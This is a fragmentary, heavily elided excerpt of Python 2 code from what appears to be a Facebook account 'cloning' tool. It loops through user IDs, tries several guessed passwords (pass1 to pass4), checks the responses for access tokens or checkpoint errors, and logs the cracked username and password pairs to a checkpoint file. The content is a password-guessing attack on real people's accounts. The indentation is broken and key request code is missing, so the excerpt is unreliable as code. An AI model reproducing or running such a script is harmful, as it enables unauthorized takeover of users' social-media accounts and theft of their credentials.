...
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;32m[1]START CLONING 2004-2006'
    time.sleep(0.10)
  ...
  try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[MAHDI 7 DAYS] ' + k + c + user + '  》  ' + pass1+'\n═════════════════════════════════════════════'
					...
					cpb.append(c+user+pass1)
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;97m[MAHDI 7 DAYS] ' + k + c + user + '  》  ' + pass2+'\n═════════════════════════════════════════════'
 					        cps = open('save/checkpoint.txt', 'a')
 				            ...
 				            if 'access_token' in q:
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;97m[MAHDI 7 DAYS] ' + k + c + user + '  》  ' + pass3+'\n═════════════════════════════════════════════'
 					                cps = open('save/checkpoint.txt', 'a')
 				                    ...
 				                    if 'access_token' in q:
 				                        ...
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;97m[MAHDI 7 DAYS] ' + k + c + user + '  》  ' + pass4+'\n═════════════════════════════════════════════'
 					                        cps = open('save/checkpoint.txt', 'a')
